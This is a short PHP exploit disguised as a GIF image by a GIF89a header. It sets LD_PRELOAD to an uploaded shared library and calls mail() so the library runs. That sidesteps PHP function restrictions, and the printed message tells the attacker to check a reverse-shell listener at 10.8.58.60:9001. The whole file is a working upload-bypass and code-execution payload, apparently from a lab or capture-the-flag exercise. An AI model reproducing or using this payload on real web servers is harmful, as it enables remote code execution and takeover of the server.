GIF89a
<?php

$caminho_so = '/var/www/html/uploads/abd61783301c0e6f593c3a5864e9769f.so'; 

putenv("LD_PRELOAD=" . $caminho_so);

mail("qualquer@email.com", "assunto", "mensagem", "From: attacker@example.com");

putenv("LD_PRELOAD=");

echo "Exploit LD_PRELOAD disparado. Verifique o listener (10.8.58.60:9001).";

?>
